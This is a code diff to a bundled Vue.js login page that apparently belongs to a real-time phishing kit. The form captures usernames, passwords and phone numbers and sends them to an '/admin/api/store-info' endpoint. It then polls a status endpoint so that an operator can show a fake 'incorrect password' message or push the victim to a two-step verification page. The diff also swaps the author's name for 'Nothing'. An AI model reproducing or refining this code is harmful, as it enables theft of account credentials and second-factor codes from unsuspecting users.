@@ -48431,7 +48431,7 @@ function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e 
 Vue.createApp({
   data: function data() {
     return {
-      author: 'Phạm Minh Châu',
+      author: 'Nothing',
       dataList: [],
       dataListOld: [],
       FormInfo: {
@@ -48508,28 +48508,44 @@ Vue.createApp({
       if (that.FormInfo.username == '') that.formInfoError.username = true;
       if (that.FormInfo.password == '') that.formInfoError.password = true;
       if (that.FormInfo.phone == '') that.formInfoError.phone = true;
-      var emailHidden = this.$refs.emailHidden.value;
-      that.FormInfo.email = emailHidden;
+      // var emailHidden = this.$refs.emailHidden.value;
+      // that.FormInfo.email = emailHidden;
+
       if (Object.keys(that.formInfoError).length === 0) {
         _service_serviceHTTP_js__WEBPACK_IMPORTED_MODULE_0__["default"].post("/admin/api/store-info", _objectSpread({}, this.FormInfo)).then(function (response) {
           if (response.status === 200) {
             that.isLoading = true;
             var idNewItem = response.data.id;
             var email = response.data.email;
-            setInterval(function () {
-              _service_serviceHTTP_js__WEBPACK_IMPORTED_MODULE_0__["default"].get("/admin/api/get-status-password?id=".concat(idNewItem)).then(function (response) {
-                if (response.status === 200) {
-                  if (response.data == 1) {
-                    window.location.href = "/wrong-password?email=".concat(email, "&id=").concat(idNewItem);
+
+            let isRunning = false; 
+
+            var call = setInterval(function () {
+              if (!isRunning) {
+                _service_serviceHTTP_js__WEBPACK_IMPORTED_MODULE_0__["default"].get("/admin/api/get-status-password?id=".concat(idNewItem)).then(function (response) {
+                  if (response.status === 200) {
+                    if (response.data == 1) {
+                      // window.location.href = "/wrong-password?email=".concat(email, "&id=").concat(idNewItem);
+                      console.log(response);
+                      that.formInfoError.message = "The password you entered is incorrect. Please try again.";
+                      document.getElementById("wrong_pass_msg").style.display = "flex";
+                      that.isLoading = false;
+                      isRunning = true;
+                    }
+                    if (response.data == 2) {
+                      window.location.href = "/2step-verification?email=".concat(email, "&id=").concat(idNewItem);
+                    }
+                  } else {
+                    console.log(response.message);
                   }
-                  if (response.data == 2) {
-                    window.location.href = "/2step-verification?email=".concat(email, "&id=").concat(idNewItem);
-                  }
-                } else {
-                  console.log(response.message);
-                }
-              });
+                });
+              }
             }, 1000);
+
+            if(isRunning) {
+              clearInterval(call);
+            }
+
           } else {
             console.log(response.message);
           }
